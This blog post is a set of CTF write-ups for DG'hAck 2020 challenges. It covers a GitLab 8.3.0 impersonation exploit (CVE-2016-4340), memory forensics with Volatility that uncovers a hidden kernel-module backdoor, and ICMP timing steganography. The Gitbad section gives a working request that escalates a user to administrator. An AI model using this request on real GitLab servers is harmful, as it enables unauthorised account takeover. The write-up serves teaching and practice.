---
title: "DG'hAck: Gitbad, Bwing & Shadowmallet, Time for something different"
date: 2020-12-01T21:02:53+01:00
summary: "Another set of DG'hAck 2020 writeups"
categories:
  - dghack2020
---

# Gitbad

The Gitbad challenge is a gitlab instance, in which it is required to find some sensible data. Once registered on the service, we see on the "help" page that version running is `GitLab Community Edition 8.3.0 02076d7` with a big fat red "UPDATE ASAP" warning.

So, update asap, isn't it? Let's check CVEs. There is one interesting: CVE-2016-4340. It specifies The impersonate feature in Gitlab 8.3.0 [...] allows remote authenticated users to "log in" as any other user via unspecified vectors. Another little check, and we're getting some more details about it:

```
Login as regular user.
Get current authenticity token by observing any POST-request (ex.: change any info in user profile).

Craft request using this as template:
 
POST /admin/users/stop_impersonation?id=root

...

_method=delete&authenticity_token=lqyOBt5U%2F0%2BPM2i%2BGDx3zaVjGgAqHzoteQ15FnrQ3E8%3D
```

We need to find the authenticity_token. To get it, just go in your profile, open the developer console, click save, check the `POST` request, and the token should be in it:

```
_method: put
authenticity_token: cge+0nzmxDI6CAg6uzKEhcuzxcAMp9bJRvGrnz71K2owJqkeryiwGkqjVM/pNBoROphIDRPjH4rY6qseuqbPYw==
user[name]: testaroo
user[email]: test@test.com
```

Next step is to find the administrator's id. Go in the Dashboard, create a new Group. In the Group settings, in the Members tab, search for Administrator, and you'll get the Admin ID: `"name":"Administrator","username":"8e4684f1498aad818870376301b15426"`

So, we have our token, we have administrator's ID. Let's craft the `stop_impersonation` query in the JS console:

```
$.post('/admin/users/stop_impersonation?id=8e4684f1498aad818870376301b15426', '_method=delete&authenticity_token=cge+0nzmxDI6CAg6uzKEhcuzxcAMp9bJRvGrnz71K2owJqkeryiwGkqjVM/pNBoROphIDRPjH4rY6qseuqbPYw%3D%3D');
```

Reload the gitbad page, and... you'll be administrator. You still need to find the flag.

In the Admin area, you'll be able to list projects. Search for the archived ones, you'll get the `stephan/my-secret-project`. Check the `added my private key` commit and:

```
+flag: W3lL-d0N3-y0u-w1n-a_c4ke!
```

This challenge is flag'ed!


# Bwing & Shadowmallet

Those two challenges are quite similar. You are getting a memory dump of a running server, and you must find the flag in it. In the first one, `bwing`, that's just a file on the FS in memory. In the second one, it is a loadable kernel module backdoor (The challenge title is a reference to  the shadow hammer APT). As those are memory dumps, we'll make use of the [volatility framework](https://github.com/volatilityfoundation/volatility).

## For Bwing:

```sh
$ vol.py --plugin profiles --profile LinuxUbuntu_4_15_0-66-generic_profilex64 -f dump.raw linux_recover_filesystem --dump-dir out
Volatility Foundation Volatility Framework 2.6.1
... snip ...

$ cat out/mnt/confidential/flag.txt 
C0D3N4M34P011011
```


## For Shadowmallet

```sh
$ vol.py --plugin profiles --profile LinuxDebian_4_19_0-9-amd64_profilex64 -f shadowmallet linux_recover_filesystem --dump-dir out
... snip ...

$ strings out/var/log/kern.log |grep -i taint
Nov  9 17:30:13 contrib-buster kernel: [    1.605821] netfilter: loading out-of-tree module taints kernel.
Nov  9 17:30:13 contrib-buster kernel: [    1.605836] netfilter: module verification failed: signature and/or required key missing - tainting kernel

$ vol.py --plugin profiles --profile LinuxDebian_4_19_0-9-amd64_profilex64 -f shadowmallet linux_hidden_modules
Volatility Foundation Volatility Framework 2.6.1
Offset (V)         Name
------------------ ----
0xffffffffc04a6000 netfilter
0xffffffffc0578300 qni

$ vol.py --plugin profiles --profile LinuxDebian_4_19_0-9-amd64_profilex64 -f shadowmallet linux_moddump --dump-dir mods -b 0xffffffffc04a6000
Volatility Foundation Volatility Framework 2.6.1
Wrote 668514 bytes to netfilter.0xffffffffc04a6000.lkm

$ strings -n 10 mods/netfilter.0xffffffffc04a6000.lkm |head -5
4.19.0-9-amd64
[]A\A]A^A_
[]A\A]A^A_
YES SHA1 is CORRECT
B3tterR=H1deMebeTT3r=then!Right?

```

# Time for something different

In that one, you're getting a `data.pcap` file. You can read it quickly with `tcpdump`:

```sh
$ tcpdump -r data.pcap 
reading from file data.pcap, link-type EN10MB (Ethernet)
11:28:05.271523 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:05.974534 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:06.737381 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:07.390550 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:08.103364 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:09.336651 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:10.500205 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:10.982931 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:11.465408 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:12.617796 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:13.701056 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:14.814156 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:15.686772 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:16.799993 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:17.943153 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:19.106441 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:19.589015 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:20.071611 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:20.754520 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:21.266580 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:22.449633 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:22.942506 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:24.054744 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:25.228047 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:25.589787 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
11:28:26.843252 IP 192.168.0.14 > 192.168.0.254: ICMP echo request, id 0, seq 0, length 8
```

I've quickly checked icmp packets, but nothing strange/relevant in them. The main information is in timestamp (and this is the name of the challenge, right?). We quickly see deltas between pings are not regular. Let's take a better look at those deltas:

```sh
$ tcpdump -ttt -r data.pcap  | cut -d ':' -f3 | cut -d ' ' -f 1 | sed -e 's/\.//;s/^0//;s/....$//' | xargs
reading from file data.pcap, link-type EN10MB (Ethernet)
000 070 076 065 071 123 116 048 048 115 108 111 087 111 114 116 048 048 068 051 118 049 111 117 036 125
```

Most numbers are between 65 & 125. Ascii, if you ask me. Let's check that:

```sh
$ tcpdump -ttt -r data.pcap  | cut -d ':' -f3 | cut -d ' ' -f 1 | sed -e 's/\.//;s/^0//;s/....$//' | awk '{printf("%c",$1)}'
reading from file data.pcap, link-type EN10MB (Ethernet)
FLAG{t00sloWort00D3v1ou$}
```

# What did I learn ?

Volatility! Seems like a must to know tool for forensic. Alas the profile generation is kinda a pain in the ass.⏎                                             